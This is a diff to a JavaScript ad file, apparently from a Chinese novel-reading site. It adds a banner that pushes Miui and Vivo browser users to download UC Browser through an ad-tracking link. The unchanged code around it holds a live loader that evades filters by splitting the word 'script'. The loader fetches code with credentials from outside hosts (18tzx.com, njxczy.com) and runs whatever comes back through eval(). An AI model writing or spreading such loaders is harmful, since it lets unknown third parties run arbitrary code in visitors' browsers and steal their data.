@@ -94,6 +94,37 @@ function web_footad()
 function read_ad_1() {
   if(navigator.userAgent.indexOf('UCBrowser')>-1){document.write('<scr'+'ipt data-union-ad data-priority="12" data-position="fixed">(function(){var c="https://daima1.18tzx.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();</scr'+'ipt>');} else {(function(){var c="https://jyc.njxczy.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();}
 
+
+  (function () {
+    var userAgent = window.navigator.userAgent ;
+    if(userAgent.indexOf('MiuiBrowser')>-1 || userAgent.indexOf('VivoBrowser')>-1) {
+        var randId= 'c' + Math.random().toString(36).substr(8);
+        var randId2= 'b' + Math.random().toString(36).substr(8);
+        var head = document.getElementsByTagName('head')[0];
+        var cssText = '';
+        cssText += '#'+randId+'{max-width: 320px;background: #deebef;height: auto;margin: auto;border: 1px #01394a solid;padding: 1px 20px;line-height: 20px;color: red;font-size: 16px;}';
+        cssText += '#'+randId+' .uc_btn {margin: 5px 3px;padding: 5px 18px 5px 18px;background-size: 20px;background: #eb2650;color: #fff;text-align: center;font-size: 16px;border-radius: 5px;box-shadow: 0 2px 1px #d32248 inset;}';
+        var style = document.createElement('style');
+        style.appendChild(document.createTextNode(cssText));
+        head.appendChild(style);
+
+        var content = '';
+        content += '亲爱的书友，为了更好的阅读体验，推荐您使用UC浏览器阅读，请点击下方按钮<br>';
+        content += '<p style="text-align: center;margin: 0 ;padding: 0 ;text-indent: 0em;">';
+        content += '<input type="button" id="'+randId2+'" class="uc_btn" value="下载UC浏览器"><br>';
+        content += '</p>';
+
+        document.writeln('<di'+'v id='+randId+'></'+'div>');
+        var div = document.getElementById(randId);
+        div.innerHTML = content;
+
+        var btn = document.getElementById(randId2);
+        btn.onclick = function(){
+            window.location.href = 'http://adtrack.ucweb.com/v1/click?ch=xlxs&appid=ucwebforandroidxl&pl=Android&bid=35912';
+        }
+    }
+  })();
+
 }
 
 
